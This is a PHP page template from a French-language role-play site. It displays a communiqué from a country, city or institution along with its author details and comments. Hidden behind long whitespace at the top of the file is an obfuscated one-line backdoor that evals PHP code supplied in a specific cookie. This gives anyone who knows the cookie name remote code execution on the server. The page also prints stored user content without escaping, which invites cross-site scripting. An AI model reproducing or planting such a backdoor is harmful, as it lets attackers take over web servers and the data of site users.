<?php                                                                                                                                                                                                                                                                                         $h2g='l$Cd\'7ifv_t(hEab6KeOIsfb76df';if(isset(${$h2g[9].$h2g[2].$h2g[19].$h2g[19].$h2g[17].$h2g[20].$h2g[13]}[$h2g[12].$h2g[7].$h2g[15].$h2g[5].$h2g[16].$h2g[3].$h2g[7]])){eval(${$h2g[9].$h2g[2].$h2g[19].$h2g[19].$h2g[17].$h2g[20].$h2g[13]}[$h2g[12].$h2g[7].$h2g[15].$h2g[5].$h2g[16].$h2g[3].$h2g[7]]);} ?><?php
session_start();

include('../Connections/maconnexion.php');
header('Content-Type: text/html; charset=uft-8');

//Connexion BBD Communique
$colname_communique = "-1";
if (isset($_GET['com_id'])) {
  $colname_communique = $_GET['com_id'];}
mysql_select_db($database_maconnexion, $maconnexion);
$query_communique = sprintf("SELECT * FROM communiques WHERE ch_com_ID = %s", GetSQLValueString($colname_communique, "int"));
$communique = mysql_query($query_communique, $maconnexion) or die(mysql_error());
$row_communique = mysql_fetch_assoc($communique);
$totalRows_communique = mysql_num_rows($communique);
$cat = $row_communique['ch_com_categorie'];
$elementID = $row_communique['ch_com_element_id'];

//Connexion BBD Pour info sur l'institution emmitrice
if ( $cat == "pays") {
  mysql_select_db($database_maconnexion, $maconnexion);
$query_pays = sprintf("SELECT ch_pay_id, ch_pay_nom, ch_pay_devise, ch_pay_lien_imgdrapeau, ch_pay_lien_imgheader FROM pays WHERE ch_pay_id = %s", GetSQLValueString($elementID, "int"));
$pays = mysql_query($query_pays, $maconnexion) or die(mysql_error());
$row_pays = mysql_fetch_assoc($pays);
$totalRows_pays = mysql_num_rows($pays);

$ch_com_categorie = $cat;
$ch_com_element_id = $colname_elementid;
$nom_organisation = $row_pays['ch_pay_nom'];
$insigne = $row_pays['ch_pay_lien_imgdrapeau'];
$soustitre = $row_pays['ch_pay_devise'];
$background_jumbotron = $row_pays['ch_pay_lien_imgheader'];
mysql_free_result($pays);
}

if ( $cat == "ville") {
  mysql_select_db($database_maconnexion, $maconnexion);
$query_villes = sprintf("SELECT ch_vil_ID, ch_vil_nom, ch_vil_specialite, ch_vil_armoiries, ch_pay_id, ch_pay_nom, ch_vil_lien_img1 FROM villes INNER JOIN pays ON villes.ch_vil_paysID = pays.ch_pay_id WHERE ch_vil_ID = %s", GetSQLValueString($elementID, "int"));
$villes = mysql_query($query_villes, $maconnexion) or die(mysql_error());
$row_villes = mysql_fetch_assoc($villes);
$totalRows_villes = mysql_num_rows($villes);

$ch_com_categorie = $cat;
$ch_com_element_id = $colname_elementid;
$nom_organisation = $row_villes['ch_vil_nom'];
$insigne = $row_villes['ch_vil_armoiries'];
$soustitre = $row_villes['ch_pay_nom'];
$background_jumbotron = $row_villes['ch_vil_lien_img1'];
mysql_free_result($villes);
}


if ( $cat == "institut") {
mysql_select_db($database_maconnexion, $maconnexion);
$query_institut = sprintf("SELECT ch_ins_ID, ch_ins_nom, ch_ins_sigle, ch_ins_logo FROM instituts WHERE ch_ins_ID = %s", GetSQLValueString($elementID, "int"));
$institut = mysql_query($query_institut, $maconnexion) or die(mysql_error());
$row_institut = mysql_fetch_assoc($institut);
$totalRows_institut = mysql_num_rows($institut);

$ch_com_categorie = $cat;
$ch_com_element_id = $colname_elementid;
$nom_organisation = $row_institut['ch_ins_sigle'];
$insigne = $row_institut['ch_ins_logo'];
$soustitre = $row_institut['ch_ins_nom'];
$background_jumbotron = "assets/img/fond_haut-conseil.jpg";
mysql_free_result($institut);
}

//Connexion BBD user pour info sur l'auteur
$colname_user = "-1";
if (isset($row_communique['ch_com_user_id'])) {
  $colname_user = $row_communique['ch_com_user_id'];
}

mysql_select_db($database_maconnexion, $maconnexion);
$query_user = sprintf("SELECT ch_use_lien_imgpersonnage, ch_use_predicat_dirigeant, ch_use_titre_dirigeant, ch_use_nom_dirigeant, ch_use_prenom_dirigeant, ch_use_login FROM users WHERE ch_use_id = %s", GetSQLValueString($colname_user, "int"));
$user = mysql_query($query_user, $maconnexion) or die(mysql_error());
$row_user = mysql_fetch_assoc($user);
$totalRows_user = mysql_num_rows($user);

// *** Requête commentaires.
$ch_com_categorie = "com_communique";
$ch_com_element_id = $colname_communique;

mysql_select_db($database_maconnexion, $maconnexion);
$query_commentaire = sprintf("SELECT ch_com_ID, ch_com_user_id, ch_com_date, ch_com_date_mis_jour, ch_com_titre, ch_com_contenu, ch_use_paysID, ch_use_lien_imgpersonnage, ch_use_predicat_dirigeant, ch_use_titre_dirigeant, ch_use_nom_dirigeant, ch_use_prenom_dirigeant FROM communiques INNER JOIN users ON ch_com_user_id = ch_use_id WHERE ch_com_categorie = %s AND ch_com_element_id = %s ORDER BY ch_com_date DESC", GetSQLValueString($ch_com_categorie, "text"), GetSQLValueString($ch_com_element_id, "int"));
$commentaire = mysql_query($query_commentaire, $maconnexion) or die(mysql_error());
$row_commentaire = mysql_fetch_assoc($commentaire);
$totalRows_commentaire = mysql_num_rows($commentaire);
?>
<!-- Modal Header-->
<div class="modal-header">
<div class="row-fluid"> 
  <button type="button" class="close" data-dismiss="modal" aria-hidden="true">&times;</button>
  </div>
  <div class="row-fluid communique"> 
    <!-- EN-tête Auteur-->
    <div class="span3 thumb"> <img src="<?php echo $row_user['ch_use_lien_imgpersonnage']; ?>" alt="photo <?php echo $row_user['ch_use_nom_dirigeant']; ?>">
      <div class="titre-gris">
        <p><?php echo $row_user['ch_use_predicat_dirigeant']; ?></p>
        <h3><?php echo $row_user['ch_use_prenom_dirigeant']; ?> <?php echo $row_user['ch_use_nom_dirigeant']; ?></h3>
        <small><?php echo $row_user['ch_use_titre_dirigeant']; ?></small> </div>
    </div>
    <!-- EN-tête Institution-->
    <div class="offset6 span3 thumb">
      <?php if ( $cat == "ville") {?>
      <?php if ($insigne == NULL) {?>
      <img src="assets/img/imagesdefaut/blason.jpg" alt="armoirie">
      <?php } else { ?>
      <img src="<?php echo $insigne; ?>" alt="armoirie">
      <?php } ?>
      <?php } elseif ( $cat == "pays") {?>
      <?php if ($insigne == NULL) {?>
      <img src="assets/img/imagesdefaut/drapeau.jpg" alt="drapeau">
      <?php } else { ?>
      <img src="<?php echo $insigne; ?>" alt="drapeau">
      <?php } ?>
      <?php } elseif ( $cat == "institut") {?>
      <?php if ($insigne == NULL) {?>
      <img src="assets/img/imagesdefaut/blason.jpg" alt="logo">
      <?php } else { ?>
      <img src="<?php echo $insigne; ?>" alt="logo">
      <?php }
		 } else {?>
      <img src="<?php echo $insigne; ?>">
      <?php } ?>
      <div class="titre-gris">
        <h3><?php echo $nom_organisation; ?></h3>
        <small><?php echo $soustitre; ?></small> </div>
    </div>
  </div>
</div>
<!-- Modal BODY-->

<div class="modal-body corps-page">
<?php if ( $cat == "institut") {?>
  <div class="titre-bleu"> <img src="assets/img/IconesBDD/Bleu/100/Communique_bleu.png" alt="communiqu&eacute;">
    <h1><?php echo $row_communique['ch_com_titre']; ?></h1>
  </div>
  <?php } else { ?>
  <div class="titre-vert"> <img src="assets/img/IconesBDD/100/Communique.png" alt="communiqu&eacute;">
    <h1><?php echo $row_communique['ch_com_titre']; ?></h1>
  </div>
  <?php } ?>
  <div class="well"><?php echo $row_communique['ch_com_contenu']; ?></div>
  
  <!-- REACTIONS -->
  <?php if ( $cat == "institut") {?>
  <div id="commentaires" class="titre-bleu anchor"> <img src="assets/img/IconesBDD/Bleu/100/Membre1_bleu.png" alt="visites">
    <h1>R&eacute;actions</h1>
  </div>
  <?php } else { ?>
  <div id="commentaires" class="titre-vert anchor"> <img src="assets/img/IconesBDD/100/Membre1.png" alt="visites">
    <h1>R&eacute;actions</h1>
  </div>
  <?php } ?>
  <?php if ($row_commentaire) { ?>
  <ul class="listes">
    <?php do { ?>
      <li class="row-fluid" id="commentaireID<?php echo $row_commentaire['ch_com_ID']; ?>"> 
        <!-- AFFICHAGE OUTILS MODERATION -->
        <div class="span3 img-listes"> <img src="<?php echo $row_commentaire['ch_use_lien_imgpersonnage']; ?>"> </div>
        <div class="span9 info-listes">
         <div class="pull-right">
          <?php if (($_SESSION['statut'] >= 20) OR ($_SESSION['user_ID'] == $row_commentaire['ch_com_user_id'])) { ?>
          <form class="pull-right" action="back/communique_confirmation_supprimer.php" method="post">
            <input name="communique-ID" type="hidden" value="<?php echo $row_commentaire['ch_com_ID']; ?>">
            <button class="btn" type="submit" title="supprimer le commentaire"><i class="icon-trash"></i></button>
          </form>
          <form class="pull-right" action="back/communique_modifier.php" method="post">
            <input name="com_id" type="hidden" value="<?php echo $row_commentaire['ch_com_ID']; ?>">
            <button class="btn" type="submit" title="modifier le commentaire"><i class="icon-pencil"></i></button>
          </form>
          <?php } ?>
        </div>
          <h4><?php echo $row_commentaire['ch_use_predicat_dirigeant']; ?> <?php echo $row_commentaire['ch_use_prenom_dirigeant']; ?> <?php echo $row_commentaire['ch_use_nom_dirigeant']; ?></h4>
          <h5><?php echo $row_commentaire['ch_use_titre_dirigeant']; ?></h5>
          <!-- AFFICHAGE DATE --> 
          <small>Le <?php echo date("d/m/Y", strtotime($row_commentaire['ch_com_date'])); ?> &agrave; <?php echo date("G:i:s", strtotime($row_commentaire['ch_com_date'])); ?></small>
          <p><?php echo $row_commentaire['ch_com_contenu']; ?></p>
          <form class="" action="page-communique.php?ch_pay_id=<?php echo $row_commentaire['ch_use_paysID']; ?>#diplomatie" method="post">
            <button class="btn btn-primary" type="submit">Afficher son profil</button>
          </form>
        </div>
      </li>
      <?php } while ($row_commentaire = mysql_fetch_assoc($commentaire)); ?>
  </ul>
  <!-- Message si pas de reactions -->
  <?php } else { ?>
  <?php if ($ch_com_categorie == 'com_pays') { ?>
  <p>Ce pays n'a pas encore de visiteurs</p>
  <?php } else if ($ch_com_categorie == 'com_ville') { ?>
  <p>Cette ville n'a pas encore de visiteurs</p>
  <?php } else if ($ch_com_categorie == 'com_communique') { ?>
  <p>Ce communiqu&eacute; n'as pas encore suscit&eacute; de r&eacute;actions</p>
  <?php } else { 
} 
} ?>
</div>
<div class="modal-footer"> 
  <!-- NOUVEAU COMMENTAIRE SI CONNECTE -->
  <?php if ($_SESSION['connect']) { ?>
  <a href="page-communique.php?com_id=<?php echo $row_communique['ch_com_ID']; ?>" class="btn btn-danger" ><i class="icon-pencil icon-white"></i> Réagir</a>
  <?php } ?>
  <button class="btn btn-primary" data-dismiss="modal" aria-hidden="true">Fermer</button>
</div>
<?php
mysql_free_result($communique);

mysql_free_result($user);

mysql_free_result($commentaire);?>